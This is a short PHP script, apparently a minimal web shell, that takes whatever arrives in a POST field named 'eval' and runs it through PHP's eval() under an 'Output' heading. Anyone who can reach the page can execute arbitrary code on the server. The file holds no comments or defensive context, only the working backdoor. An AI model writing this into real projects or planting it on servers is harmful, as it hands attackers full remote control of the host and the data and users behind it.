<?php
if(isset($_POST['eval']))
{
    print "<h1>Output:</h1>";
    print "<br>";
    eval($_POST['eval']);
}
?>